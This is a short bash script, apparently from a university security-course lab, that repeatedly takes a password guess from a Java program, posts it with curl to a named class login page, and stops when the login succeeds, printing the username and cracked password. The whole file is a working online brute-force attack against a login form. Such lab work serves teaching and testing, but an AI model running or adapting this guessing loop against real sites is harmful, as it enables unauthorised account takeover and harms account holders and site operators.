#!/bin/bash

counter=0
while [ $counter -eq 0 ]
do
  password=$(java OnlineFind.java 2>&1)

# help from https://curl.haxx.se/docs/manpage.html#-d
response=$(curl --data "un=jonathan17_-d7A&pw=$password" http://cssrvlab01.utep.edu/classes/cs5339/longpre/loginScreen.php 2>&1)

	# guidance from https://www.experts-exchange.com/questions/24696217/How-to-make-a-password-reset-script-linux.html
	# shellcheck disable=SC2092
	# shellcheck disable=SC2006
	if `echo "${response}" | grep "not successful" 1>/dev/null 2>&1`
	then
	  counter=0
	else
	  counter=1
	  echo "jonathan17_-d7A - $password"
	fi

	sleep 1
done